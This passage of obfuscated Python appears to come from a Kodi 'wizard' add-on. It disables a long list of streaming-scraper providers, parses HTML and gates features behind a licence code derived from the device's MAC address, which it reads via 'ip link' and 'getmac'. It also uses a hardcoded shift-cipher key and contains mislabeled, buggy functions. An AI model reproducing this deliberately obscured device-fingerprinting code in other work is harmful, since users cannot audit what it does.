		OOOO0OO0OO00O00O0 .setSetting ('provider.animeloads','false')#line:1080
		OOOO0OO0OO00O00O0 .setSetting ('provider.animetoon','false')#line:1081
		OOOO0OO0OO00O00O0 .setSetting ('provider.bnwmovies','false')#line:1082
		OOOO0OO0OO00O00O0 .setSetting ('provider.boxfilm','false')#line:1083
		OOOO0OO0OO00O00O0 .setSetting ('provider.bs','false')#line:1084
		OOOO0OO0OO00O00O0 .setSetting ('provider.cartoonhd','false')#line:1085
		OOOO0OO0OO00O00O0 .setSetting ('provider.cdahd','false')#line:1086
		OOOO0OO0OO00O00O0 .setSetting ('provider.cdax','false')#line:1087
		OOOO0OO0OO00O00O0 .setSetting ('provider.cine','false')#line:1088
		OOOO0OO0OO00O00O0 .setSetting ('provider.cinenator','false')#line:1089
		OOOO0OO0OO00O00O0 .setSetting ('provider.cmovieshdbz','false')#line:1090
		OOOO0OO0OO00O00O0 .setSetting ('provider.coolmoviezone','false')#line:1091
		OOOO0OO0OO00O00O0 .setSetting ('provider.ddl','false')#line:1092
		OOOO0OO0OO00O00O0 .setSetting ('provider.deepmovie','false')#line:1093
		OOOO0OO0OO00O00O0 .setSetting ('provider.ekinomaniak','false')#line:1094
		OOOO0OO0OO00O00O0 .setSetting ('provider.ekinotv','false')#line:1095
		OOOO0OO0OO00O00O0 .setSetting ('provider.filiser','false')#line:1096
		OOOO0OO0OO00O00O0 .setSetting ('provider.filmpalast','false')#line:1097
		OOOO0OO0OO00O00O0 .setSetting ('provider.filmwebbooster','false')#line:1098
		OOOO0OO0OO00O00O0 .setSetting ('provider.filmxy','false')#line:1099
		OOOO0OO0OO00O00O0 .setSetting ('provider.fmovies','false')#line:1100
		OOOO0OO0OO00O00O0 .setSetting ('provider.foxx','false')#line:1101
		OOOO0OO0OO00O00O0 .setSetting ('provider.freefmovies','false')#line:1102
		OOOO0OO0OO00O00O0 .setSetting ('provider.freeputlocker','false')#line:1103
		OOOO0OO0OO00O00O0 .setSetting ('provider.furk','false')#line:1104
		OOOO0OO0OO00O00O0 .setSetting ('provider.gamatotv','false')#line:1105
		OOOO0OO0OO00O00O0 .setSetting ('provider.gogoanime','false')#line:1106
		OOOO0OO0OO00O00O0 .setSetting ('provider.gowatchseries','false')#line:1107
		OOOO0OO0OO00O00O0 .setSetting ('provider.hackimdb','false')#line:1108
		OOOO0OO0OO00O00O0 .setSetting ('provider.hdfilme','false')#line:1109
		OOOO0OO0OO00O00O0 .setSetting ('provider.hdmto','false')#line:1110
		OOOO0OO0OO00O00O0 .setSetting ('provider.hdpopcorns','false')#line:1111
		OOOO0OO0OO00O00O0 .setSetting ('provider.hdstreams','false')#line:1112
		OOOO0OO0OO00O00O0 .setSetting ('provider.horrorkino','false')#line:1114
		OOOO0OO0OO00O00O0 .setSetting ('provider.iitv','false')#line:1115
		OOOO0OO0OO00O00O0 .setSetting ('provider.iload','false')#line:1116
		OOOO0OO0OO00O00O0 .setSetting ('provider.iwaatch','false')#line:1117
		OOOO0OO0OO00O00O0 .setSetting ('provider.kinodogs','false')#line:1118
		OOOO0OO0OO00O00O0 .setSetting ('provider.kinoking','false')#line:1119
		OOOO0OO0OO00O00O0 .setSetting ('provider.kinow','false')#line:1120
		OOOO0OO0OO00O00O0 .setSetting ('provider.kinox','false')#line:1121
		OOOO0OO0OO00O00O0 .setSetting ('provider.lichtspielhaus','false')#line:1122
		OOOO0OO0OO00O00O0 .setSetting ('provider.liomenoi','false')#line:1123
		OOOO0OO0OO00O00O0 .setSetting ('provider.magnetdl','false')#line:1126
		OOOO0OO0OO00O00O0 .setSetting ('provider.megapelistv','false')#line:1127
		OOOO0OO0OO00O00O0 .setSetting ('provider.movie2k-ac','false')#line:1128
		OOOO0OO0OO00O00O0 .setSetting ('provider.movie2k-ag','false')#line:1129
		OOOO0OO0OO00O00O0 .setSetting ('provider.movie2z','false')#line:1130
		OOOO0OO0OO00O00O0 .setSetting ('provider.movie4k','false')#line:1131
		OOOO0OO0OO00O00O0 .setSetting ('provider.movie4kis','false')#line:1132
		OOOO0OO0OO00O00O0 .setSetting ('provider.movieneo','false')#line:1133
		OOOO0OO0OO00O00O0 .setSetting ('provider.moviesever','false')#line:1134
		OOOO0OO0OO00O00O0 .setSetting ('provider.movietown','false')#line:1135
		OOOO0OO0OO00O00O0 .setSetting ('provider.mvrls','false')#line:1137
		OOOO0OO0OO00O00O0 .setSetting ('provider.netzkino','false')#line:1138
		OOOO0OO0OO00O00O0 .setSetting ('provider.odb','false')#line:1139
		OOOO0OO0OO00O00O0 .setSetting ('provider.openkatalog','false')#line:1140
		OOOO0OO0OO00O00O0 .setSetting ('provider.ororo','false')#line:1141
		OOOO0OO0OO00O00O0 .setSetting ('provider.paczamy','false')#line:1142
		OOOO0OO0OO00O00O0 .setSetting ('provider.peliculasdk','false')#line:1143
		OOOO0OO0OO00O00O0 .setSetting ('provider.pelisplustv','false')#line:1144
		OOOO0OO0OO00O00O0 .setSetting ('provider.pepecine','false')#line:1145
		OOOO0OO0OO00O00O0 .setSetting ('provider.primewire','false')#line:1146
		OOOO0OO0OO00O00O0 .setSetting ('provider.projectfreetv','false')#line:1147
		OOOO0OO0OO00O00O0 .setSetting ('provider.proxer','false')#line:1148
		OOOO0OO0OO00O00O0 .setSetting ('provider.pureanime','false')#line:1149
		OOOO0OO0OO00O00O0 .setSetting ('provider.putlocker','false')#line:1150
		OOOO0OO0OO00O00O0 .setSetting ('provider.putlockerfree','false')#line:1151
		OOOO0OO0OO00O00O0 .setSetting ('provider.reddit','false')#line:1152
		OOOO0OO0OO00O00O0 .setSetting ('provider.cartoonwire','false')#line:1153
		OOOO0OO0OO00O00O0 .setSetting ('provider.seehd','false')#line:1154
		OOOO0OO0OO00O00O0 .setSetting ('provider.segos','false')#line:1155
		OOOO0OO0OO00O00O0 .setSetting ('provider.serienstream','false')#line:1156
		OOOO0OO0OO00O00O0 .setSetting ('provider.series9','false')#line:1157
		OOOO0OO0OO00O00O0 .setSetting ('provider.seriesever','false')#line:1158
		OOOO0OO0OO00O00O0 .setSetting ('provider.seriesonline','false')#line:1159
		OOOO0OO0OO00O00O0 .setSetting ('provider.seriespapaya','false')#line:1160
		OOOO0OO0OO00O00O0 .setSetting ('provider.sezonlukdizi','false')#line:1161
		OOOO0OO0OO00O00O0 .setSetting ('provider.solarmovie','false')#line:1162
		OOOO0OO0OO00O00O0 .setSetting ('provider.solarmoviez','false')#line:1163
		OOOO0OO0OO00O00O0 .setSetting ('provider.stream-to','false')#line:1164
		OOOO0OO0OO00O00O0 .setSetting ('provider.streamdream','false')#line:1165
		OOOO0OO0OO00O00O0 .setSetting ('provider.streamflix','false')#line:1166
		OOOO0OO0OO00O00O0 .setSetting ('provider.streamit','false')#line:1167
		OOOO0OO0OO00O00O0 .setSetting ('provider.swatchseries','false')#line:1168
		OOOO0OO0OO00O00O0 .setSetting ('provider.szukajkatv','false')#line:1169
		OOOO0OO0OO00O00O0 .setSetting ('provider.tainiesonline','false')#line:1170
		OOOO0OO0OO00O00O0 .setSetting ('provider.tainiomania','false')#line:1171
		OOOO0OO0OO00O00O0 .setSetting ('provider.tata','false')#line:1174
		OOOO0OO0OO00O00O0 .setSetting ('provider.trt','false')#line:1175
		OOOO0OO0OO00O00O0 .setSetting ('provider.tvbox','false')#line:1176
		OOOO0OO0OO00O00O0 .setSetting ('provider.ultrahd','false')#line:1177
		OOOO0OO0OO00O00O0 .setSetting ('provider.video4k','false')#line:1178
		OOOO0OO0OO00O00O0 .setSetting ('provider.vidics','false')#line:1179
		OOOO0OO0OO00O00O0 .setSetting ('provider.view4u','false')#line:1180
		OOOO0OO0OO00O00O0 .setSetting ('provider.watchseries','false')#line:1181
		OOOO0OO0OO00O00O0 .setSetting ('provider.xrysoi','false')#line:1182
		OOOO0OO0OO00O00O0 .setSetting ('provider.library','false')#line:1183
def fixfont ():#line:1186
	OO0O000OO00000OOO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1187
	O00O000OO00O00OOO =json .loads (OO0O000OO00000OOO );#line:1189
	O00O0OO00OO000O0O =O00O000OO00O00OOO ["result"]["settings"]#line:1190
	OO00OO0OO000OO00O =[O00OO00O000O0OO00 for O00OO00O000O0OO00 in O00O0OO00OO000O0O if O00OO00O000O0OO00 ["id"]=="audiooutput.audiodevice"][0 ]#line:1192
	OOOO0OO00O00OO0OO =OO00OO0OO000OO00O ["options"];#line:1193
	OO0OOOOOOOOOOO0OO =OO00OO0OO000OO00O ["value"];#line:1194
	O000OO0OO0OOO0OOO =[O000O00OO0O00OO0O for (O000O00OO0O00OO0O ,OO000OOOOOOOOOO00 )in enumerate (OOOO0OO00O00OO0OO )if OO000OOOOOOOOOO00 ["value"]==OO0OOOOOOOOOOO0OO ][0 ];#line:1196
	OO0O0OO0O000OO000 =(O000OO0OO0OOO0OOO +1 )%len (OOOO0OO00O00OO0OO )#line:1198
	O000000O00O000O0O =OOOO0OO00O00OO0OO [OO0O0OO0O000OO000 ]["value"]#line:1200
	O0O000O0OO00OOO0O =OOOO0OO00O00OO0OO [OO0O0OO0O000OO000 ]["label"]#line:1201
	O0000000OO0O0OO00 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1203
	try :#line:1205
		OOOO0O00O0OOO00OO =json .loads (O0000000OO0O0OO00 );#line:1206
		if OOOO0O00O0OOO00OO ["result"]!=True :#line:1208
			raise Exception #line:1209
	except :#line:1210
		sys .stderr .write ("Error switching audio output device")#line:1211
		raise Exception #line:1212
def parseDOM2 (OOOO0O0O0OO000OO0 ,name =u"",attrs ={},ret =False ):#line:1213
	if isinstance (OOOO0O0O0OO000OO0 ,str ):#line:1216
		try :#line:1217
			OOOO0O0O0OO000OO0 =[OOOO0O0O0OO000OO0 .decode ("utf-8")]#line:1218
		except :#line:1219
			OOOO0O0O0OO000OO0 =[OOOO0O0O0OO000OO0 ]#line:1220
	elif isinstance (OOOO0O0O0OO000OO0 ,str ):#line:1221
		OOOO0O0O0OO000OO0 =[OOOO0O0O0OO000OO0 ]#line:1222
	elif not isinstance (OOOO0O0O0OO000OO0 ,list ):#line:1223
		return u""#line:1224
	if not name .strip ():#line:1226
		return u""#line:1227
	O000OOO00000OOO00 =[]#line:1229
	for OO0O0OOO00OO00000 in OOOO0O0O0OO000OO0 :#line:1230
		OOO00O0OOO00OOOOO =re .compile ('(<[^>]*?\n[^>]*?>)').findall (OO0O0OOO00OO00000 )#line:1231
		for OO00OO00O000OOOO0 in OOO00O0OOO00OOOOO :#line:1232
			OO0O0OOO00OO00000 =OO0O0OOO00OO00000 .replace (OO00OO00O000OOOO0 ,OO00OO00O000OOOO0 .replace ("\n"," "))#line:1233
		O0000O0OOOOO0OO00 =[]#line:1235
		for OO00O0OOOO00OO00O in attrs :#line:1236
			O0OOO00OO0O0OOO0O =re .compile ('(<'+name +'[^>]*?(?:'+OO00O0OOOO00OO00O +'=[\'"]'+attrs [OO00O0OOOO00OO00O ]+'[\'"].*?>))',re .M |re .S ).findall (OO0O0OOO00OO00000 )#line:1237
			if len (O0OOO00OO0O0OOO0O )==0 and attrs [OO00O0OOOO00OO00O ].find (" ")==-1 :#line:1238
				O0OOO00OO0O0OOO0O =re .compile ('(<'+name +'[^>]*?(?:'+OO00O0OOOO00OO00O +'='+attrs [OO00O0OOOO00OO00O ]+'.*?>))',re .M |re .S ).findall (OO0O0OOO00OO00000 )#line:1239
			if len (O0000O0OOOOO0OO00 )==0 :#line:1241
				O0000O0OOOOO0OO00 =O0OOO00OO0O0OOO0O #line:1242
				O0OOO00OO0O0OOO0O =[]#line:1243
			else :#line:1244
				O0O0OOOOOO000O000 =list (range (len (O0000O0OOOOO0OO00 )))#line:1245
				O0O0OOOOOO000O000 .reverse ()#line:1246
				for O000O0OO00000O0OO in O0O0OOOOOO000O000 :#line:1247
					if not O0000O0OOOOO0OO00 [O000O0OO00000O0OO ]in O0OOO00OO0O0OOO0O :#line:1248
						del (O0000O0OOOOO0OO00 [O000O0OO00000O0OO ])#line:1249
		if len (O0000O0OOOOO0OO00 )==0 and attrs =={}:#line:1251
			O0000O0OOOOO0OO00 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (OO0O0OOO00OO00000 )#line:1252
			if len (O0000O0OOOOO0OO00 )==0 :#line:1253
				O0000O0OOOOO0OO00 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (OO0O0OOO00OO00000 )#line:1254
		if isinstance (ret ,str ):#line:1256
			O0OOO00OO0O0OOO0O =[]#line:1257
			for OO00OO00O000OOOO0 in O0000O0OOOOO0OO00 :#line:1258
				OOOOO00OO0OO00OO0 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OO00OO00O000OOOO0 )#line:1259
				if len (OOOOO00OO0OO00OO0 )==0 :#line:1260
					OOOOO00OO0OO00OO0 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OO00OO00O000OOOO0 )#line:1261
				for OO00O0OO0000O00O0 in OOOOO00OO0OO00OO0 :#line:1262
					O0OO0O00OO0O0OOOO =OO00O0OO0000O00O0 [0 ]#line:1263
					if O0OO0O00OO0O0OOOO in "'\"":#line:1264
						if OO00O0OO0000O00O0 .find ('='+O0OO0O00OO0O0OOOO ,OO00O0OO0000O00O0 .find (O0OO0O00OO0O0OOOO ,1 ))>-1 :#line:1265
							OO00O0OO0000O00O0 =OO00O0OO0000O00O0 [:OO00O0OO0000O00O0 .find ('='+O0OO0O00OO0O0OOOO ,OO00O0OO0000O00O0 .find (O0OO0O00OO0O0OOOO ,1 ))]#line:1266
						if OO00O0OO0000O00O0 .rfind (O0OO0O00OO0O0OOOO ,1 )>-1 :#line:1268
							OO00O0OO0000O00O0 =OO00O0OO0000O00O0 [1 :OO00O0OO0000O00O0 .rfind (O0OO0O00OO0O0OOOO )]#line:1269
					else :#line:1270
						if OO00O0OO0000O00O0 .find (" ")>0 :#line:1271
							OO00O0OO0000O00O0 =OO00O0OO0000O00O0 [:OO00O0OO0000O00O0 .find (" ")]#line:1272
						elif OO00O0OO0000O00O0 .find ("/")>0 :#line:1273
							OO00O0OO0000O00O0 =OO00O0OO0000O00O0 [:OO00O0OO0000O00O0 .find ("/")]#line:1274
						elif OO00O0OO0000O00O0 .find (">")>0 :#line:1275
							OO00O0OO0000O00O0 =OO00O0OO0000O00O0 [:OO00O0OO0000O00O0 .find (">")]#line:1276
					O0OOO00OO0O0OOO0O .append (OO00O0OO0000O00O0 .strip ())#line:1278
			O0000O0OOOOO0OO00 =O0OOO00OO0O0OOO0O #line:1279
		else :#line:1280
			O0OOO00OO0O0OOO0O =[]#line:1281
			for OO00OO00O000OOOO0 in O0000O0OOOOO0OO00 :#line:1282
				OOO0O00O0O0000O0O =u"</"+name #line:1283
				OO0000OOO0O0OO00O =OO0O0OOO00OO00000 .find (OO00OO00O000OOOO0 )#line:1285
				OOO0000OO00O000O0 =OO0O0OOO00OO00000 .find (OOO0O00O0O0000O0O ,OO0000OOO0O0OO00O )#line:1286
				O0OOOO00O00O00OO0 =OO0O0OOO00OO00000 .find ("<"+name ,OO0000OOO0O0OO00O +1 )#line:1287
				while O0OOOO00O00O00OO0 <OOO0000OO00O000O0 and O0OOOO00O00O00OO0 !=-1 :#line:1289
					O00O0OOO0OOO0OO0O =OO0O0OOO00OO00000 .find (OOO0O00O0O0000O0O ,OOO0000OO00O000O0 +len (OOO0O00O0O0000O0O ))#line:1290
					if O00O0OOO0OOO0OO0O !=-1 :#line:1291
						OOO0000OO00O000O0 =O00O0OOO0OOO0OO0O #line:1292
					O0OOOO00O00O00OO0 =OO0O0OOO00OO00000 .find ("<"+name ,O0OOOO00O00O00OO0 +1 )#line:1293
				if OO0000OOO0O0OO00O ==-1 and OOO0000OO00O000O0 ==-1 :#line:1295
					O00OOO00O00OO0000 =u""#line:1296
				elif OO0000OOO0O0OO00O >-1 and OOO0000OO00O000O0 >-1 :#line:1297
					O00OOO00O00OO0000 =OO0O0OOO00OO00000 [OO0000OOO0O0OO00O +len (OO00OO00O000OOOO0 ):OOO0000OO00O000O0 ]#line:1298
				elif OOO0000OO00O000O0 >-1 :#line:1299
					O00OOO00O00OO0000 =OO0O0OOO00OO00000 [:OOO0000OO00O000O0 ]#line:1300
				elif OO0000OOO0O0OO00O >-1 :#line:1301
					O00OOO00O00OO0000 =OO0O0OOO00OO00000 [OO0000OOO0O0OO00O +len (OO00OO00O000OOOO0 ):]#line:1302
				if ret :#line:1304
					OOO0O00O0O0000O0O =OO0O0OOO00OO00000 [OOO0000OO00O000O0 :OO0O0OOO00OO00000 .find (">",OO0O0OOO00OO00000 .find (OOO0O00O0O0000O0O ))+1 ]#line:1305
					O00OOO00O00OO0000 =OO00OO00O000OOOO0 +O00OOO00O00OO0000 +OOO0O00O0O0000O0O #line:1306
				OO0O0OOO00OO00000 =OO0O0OOO00OO00000 [OO0O0OOO00OO00000 .find (O00OOO00O00OO0000 ,OO0O0OOO00OO00000 .find (OO00OO00O000OOOO0 ))+len (O00OOO00O00OO0000 ):]#line:1308
				O0OOO00OO0O0OOO0O .append (O00OOO00O00OO0000 )#line:1309
			O0000O0OOOOO0OO00 =O0OOO00OO0O0OOO0O #line:1310
		O000OOO00000OOO00 +=O0000O0OOOOO0OO00 #line:1311
	return O000OOO00000OOO00 #line:1313
def addItem (OO0O00OOO0O0O0O00 ,OO00OO00O000OO00O ,O0O000000OOO00O00 ,O0000OO0O0O00O0OO ,O0O00O0000O0O00O0 ,description =None ):#line:1315
    if description ==None :description =''#line:1316
    description ='[COLOR white]'+description +'[/COLOR]'#line:1317
    O0O0O00O0OO0O00OO =sys .argv [0 ]+"?url="+que (OO00OO00O000OO00O )+"&mode="+str (O0O000000OOO00O00 )+"&name="+que (OO0O00OOO0O0O0O00 )+"&iconimage="+que (O0000OO0O0O00O0OO )+"&fanart="+que (O0O00O0000O0O00O0 )#line:1318
    O000OO0OOO00OOOO0 =True #line:1319
    try :#line:1320
        O0000OO00OOOOO0O0 =xbmcgui .ListItem (OO0O00OOO0O0O0O00 ,iconImage =O0000OO0O0O00O0OO ,thumbnailImage =O0000OO0O0O00O0OO )#line:1321
    except :#line:1322
        O0000OO00OOOOO0O0 =xbmcgui .ListItem (OO0O00OOO0O0O0O00 )#line:1323
        O0000OO00OOOOO0O0 .setArt ({'thumb':O0000OO0O0O00O0OO ,'fanart':O0000OO0O0O00O0OO ,'DefaultFolder.png':O0000OO0O0O00O0OO })#line:1324
    O0000OO00OOOOO0O0 .setInfo (type ="Video",infoLabels ={"Title":OO0O00OOO0O0O0O00 ,"Plot":description })#line:1325
    O0000OO00OOOOO0O0 .setProperty ("fanart_Image",O0O00O0000O0O00O0 )#line:1326
    O0000OO00OOOOO0O0 .setProperty ("icon_Image",O0000OO0O0O00O0OO )#line:1327
    O000OO0OOO00OOOO0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0O0O00O0OO0O00OO ,listitem =O0000OO00OOOOO0O0 ,isFolder =False )#line:1328
    return O000OO0OOO00OOOO0 #line:1329
def decode (O0O00O0000O0OOOOO ,O00O0O00O0O0O00O0 ):#line:1352
    import base64 #line:1353
    O00OOO0OO00OOO000 =[]#line:1354
    if (len (O0O00O0000O0OOOOO ))!=4 :#line:1356
     return 10 #line:1357
    O00O0O00O0O0O00O0 =base64 .urlsafe_b64decode (O00O0O00O0O0O00O0 )#line:1358
    for O00000OOO00OOOOO0 in range (len (O00O0O00O0O0O00O0 )):#line:1360
        OOOO0OO00OO0O0OOO =O0O00O0000O0OOOOO [O00000OOO00OOOOO0 %len (O0O00O0000O0OOOOO )]#line:1361
        try :#line:1362
          O000O0O0O0000OOO0 =chr ((256 +ord (O00O0O00O0O0O00O0 [O00000OOO00OOOOO0 ])-ord (OOOO0OO00OO0O0OOO ))%256 )#line:1363
        except :#line:1364
          O000O0O0O0000OOO0 =chr ((256 +(O00O0O00O0O0O00O0 [O00000OOO00OOOOO0 ])-ord (OOOO0OO00OO0O0OOO ))%256 )#line:1365
        O00OOO0OO00OOO000 .append (O000O0O0O0000OOO0 )#line:1366
    return "".join (O00OOO0OO00OOO000 )#line:1367
def tmdb_list (OOOOO000OO00O00O0 ):#line:1368
    OO0OOOOOOOOO0OOOO =decode ("7643",OOOOO000OO00O00O0 )#line:1371
    return int (OO0OOOOOOOOO0OOOO )#line:1374
def u_list (O00OO00O0O00OO000 ):#line:1375
    O0000OO0OO0O00O0O =(wiz .getS ("pass")).replace (' ','')#line:1376
    wiz .STARTP ()#line:1377
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:1378
        from math import sqrt #line:1380
        OOO00OO00O00OO000 =tmdb_list (TMDB_NEW_API )#line:1381
        try :#line:1382
            O00OOOOOOO0O0OOOO =str ((getHwAddr ('eth0'))*OOO00OO00O00OO000 )#line:1383
            O00O00OOO0O0OOOOO =int (O00OOOOOOO0O0OOOO [1 ]+O00OOOOOOO0O0OOOO [2 ]+O00OOOOOOO0O0OOOO [5 ]+O00OOOOOOO0O0OOOO [7 ])#line:1384
            OOO0OO0OOO0OO0O00 =(str (round (sqrt ((O00O00OOO0O0OOOOO *500 )+30 )+30 ,4 ))[-4 :]).replace ('.','')#line:1385
            if '.'in OOO0OO0OOO0OO0O00 :#line:1387
             OOO0OO0OOO0OO0O00 =(str (round (sqrt ((O00O00OOO0O0OOOOO *500 )+30 )+30 ,4 ))[-5 :]).replace ('.','')#line:1388
        except :#line:1389
         O00O00OOO0O0OOOOO =''#line:1390
         OOO0OO0OOO0OO0O00 =''#line:1391
        if O0000OO0OO0O00O0O ==OOO0OO0OOO0OO0O00 :#line:1392
          OO0O0O0OOO00000OO =O00OO00O0O00OO000 #line:1394
          return OO0O0O0OOO00000OO ,O00O00OOO0O0OOOOO #line:1396
        else :#line:1398
           if wiz .STARTP2 ()=='ok':#line:1400
             return O00OO00O0O00OO000 #line:1403
        return 'ok',O00O00OOO0O0OOOOO #line:1405
    else :#line:1407
           if wiz .STARTP2 ()=='ok':#line:1408
             return O00OO00O0O00OO000 #line:1410
    xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:1411
def disply_hwr ():#line:1412
   try :#line:1413
    O00O0O000OOO0O0O0 =tmdb_list (TMDB_NEW_API )#line:1414
    O0O0O00O0000O0OOO =str ((getHwAddr ('eth0'))*O00O0O000OOO0O0O0 )#line:1415
    OO00000O000O00O0O =(O0O0O00O0000O0OOO [1 ]+O0O0O00O0000O0OOO [2 ]+O0O0O00O0000O0OOO [5 ]+O0O0O00O0000O0OOO [7 ])#line:1422
    O0O00000000OO0O00 =(wiz .getS ("action"))#line:1423
    wiz .setS ('action',str (OO00000O000O00O0O ))#line:1425
   except :pass #line:1426
def disply_hwr2 ():#line:1427
   try :#line:1428
    OO00OO0O0000O0OO0 =tmdb_list (TMDB_NEW_API )#line:1429
    O00OOOO0OOO00OOOO =str ((getHwAddr ('eth0'))*OO00OO0O0000O0OO0 )#line:1431
    O00O00OOO0O00OO0O =(O00OOOO0OOO00OOOO [1 ]+O00OOOO0OOO00OOOO [2 ]+O00OOOO0OOO00OOOO [5 ]+O00OOOO0OOO00OOOO [7 ])#line:1440
    OO0OO0OO00OO0OO00 =(wiz .getS ("action"))#line:1441
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O00O00OOO0O00OO0O )#line:1444
   except :pass #line:1445
def getHwAddr (OO000O0O0OOOOOO0O ):#line:1447
   import subprocess ,time #line:1448
   if xbmc .getCondVisibility ('system.platform.android'):#line:1449
     OOO0OOOO00O0O00OO =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1450
     OOO0OO000000OOO00 =re .compile ('link/ether (.+?) brd').findall (str (OOO0OOOO00O0O00OO ))#line:1451
     OO0OOO0OOO0O0O0OO =0 #line:1452
     for OOOO00OO0OOO0000O in OOO0OO000000OOO00 :#line:1453
      if OOO0OO000000OOO00 !='00:00:00:00:00:00':#line:1454
          O0OOOO0OO0O0O00OO =OOOO00OO0OOO0000O #line:1455
          OO0OOO0OOO0O0O0OO =OO0OOO0OOO0O0O0OO +int (O0OOOO0OO0O0O00OO .replace (':',''),16 )#line:1456
          break #line:1457
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1458
       OOO00OOOOO0O00000 =0 #line:1459
       OO0OOO0OOO0O0O0OO =0 #line:1460
       OO0O000000O000O0O =[]#line:1461
       OO00O0OO00O0OOOO0 =os .popen ("getmac").read ()#line:1462
       OO00O0OO00O0OOOO0 =OO00O0OO00O0OOOO0 .split ("\n")#line:1463
       for OOOO000O0O0O00O0O in OO00O0OO00O0OOOO0 :#line:1464
            O0000O00O0000000O =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OOOO000O0O0O00O0O ,re .I )#line:1465
            if O0000O00O0000000O :#line:1466
                OOO0OO000000OOO00 =O0000O00O0000000O .group ().replace ('-',':')#line:1467
                OO0O000000O000O0O .append (OOO0OO000000OOO00 )#line:1468
                OO0OOO0OOO0O0O0OO =OO0OOO0OOO0O0O0OO +int (OOO0OO000000OOO00 .replace (':',''),16 )#line:1469
                break #line:1470
   elif xbmc .getCondVisibility ('system.platform.linux'):#line:1471
       OO0OOO0OOO0O0O0OO =0 #line:1472
       import uuid #line:1473
       OOO0OO000000OOO00 =hex (uuid .getnode ())#line:1474
       OO0OOO0OOO0O0O0OO =OO0OOO0OOO0O0O0OO +int (OOO0OO000000OOO00 .replace (':',''),16 )#line:1475
   else :#line:1476
       OO0OOO0OOO0O0O0OO =0 #line:1477
       import uuid #line:1478
       OOO0OO000000OOO00 =hex (uuid .getnode ())#line:1479
       OO0OOO0OOO0O0O0OO =OO0OOO0OOO0O0O0OO +int (OOO0OO000000OOO00 .replace (':',''),16 )#line:1480
   try :#line:1495
    return OO0OOO0OOO0O0O0OO #line:1496
   except :pass #line:1497
def getHwAddr_old (O00OO0OOOO0O000O0 ):#line:1499
   import subprocess ,time #line:1500
   OOO0OOOOO00O0O0OO ='windows'#line:1501
   if xbmc .getCondVisibility ('system.platform.android'):#line:1502
       OOO0OOOOO00O0O0OO ='android'#line:1503
   if xbmc .getCondVisibility ('system.platform.android'):#line:1504
     O00OO0OO0O00O0000 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1505
     O0O0O0OO0O0OOO0O0 =re .compile ('link/ether (.+?) brd').findall (str (O00OO0OO0O00O0000 ))#line:1507
     O00O0O00O0O0OOO00 =0 #line:1508
     for O000O00OO0OOOOO00 in O0O0O0OO0O0OOO0O0 :#line:1509
      if O0O0O0OO0O0OOO0O0 !='00:00:00:00:00:00':#line:1510
          O00O000OOOO000000 =O000O00OO0OOOOO00 #line:1511
          O00O0O00O0O0OOO00 =O00O0O00O0O0OOO00 +int (O00O000OOOO000000 .replace (':',''),16 )#line:1512
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1514
       OOOOO00OO0O00OO0O =0 #line:1515
       O00O0O00O0O0OOO00 =0 #line:1516
       O0O000O0O0OO00O0O =[]#line:1517
       OO0O0O0OO000OO0O0 =os .popen ("getmac").read ()#line:1518
       OO0O0O0OO000OO0O0 =OO0O0O0OO000OO0O0 .split ("\n")#line:1519
       for OO00OOO0OO000OO00 in OO0O0O0OO000OO0O0 :#line:1521
            O000OOOO0OO000O00 =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OO00OOO0OO000OO00 ,re .I )#line:1522
            if O000OOOO0OO000O00 :#line:1523
                O0O0O0OO0O0OOO0O0 =O000OOOO0OO000O00 .group ().replace ('-',':')#line:1524
                O0O000O0O0OO00O0O .append (O0O0O0OO0O0OOO0O0 )#line:1525
                O00O0O00O0O0OOO00 =O00O0O00O0O0OOO00 +int (O0O0O0OO0O0OOO0O0 .replace (':',''),16 )#line:1528
   else :#line:1530
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1531
   try :#line:1548
    return O00O0O00O0O0OOO00 #line:1549
   except :pass #line:1550
def getpass ():#line:1551
	disply_hwr2 ()#line:1553
def setpass ():#line:1554
    OOO0OO0O0OO0O00O0 =xbmcgui .Dialog ()#line:1555
    OOOOO0O0O0OOO0O00 =''#line:1556
    OO0O0O00OOOOO0OOO =xbmc .Keyboard (OOOOO0O0O0OOO0O00 ,'הכנס סיסמה')#line:1558
    OO0O0O00OOOOO0OOO .doModal ()#line:1559
    if OO0O0O00OOOOO0OOO .isConfirmed ():#line:1560
           OO0O0O00OOOOO0OOO =OO0O0O00OOOOO0OOO .getText ()#line:1561
    wiz .setS ('pass',str (OO0O0O00OOOOO0OOO ))#line:1562
def setuname ():#line:1563
    OOO0000O00000O000 =''#line:1564
    OO0OO0O00O000O0OO =xbmc .Keyboard (OOO0000O00000O000 ,'הכנס שם משתמש')#line:1565
    OO0OO0O00O000O0OO .doModal ()#line:1566
    if OO0OO0O00O000O0OO .isConfirmed ():#line:1567
           OOO0000O00000O000 =OO0OO0O00O000O0OO .getText ()#line:1568
           wiz .setS ('user',str (OOO0000O00000O000 ))#line:1569
def powerkodi ():#line:1570
    os ._exit (1 )#line:1571
def xml_data_advSettings_old (O0OO0O0O00O0O0OOO ):#line:1572
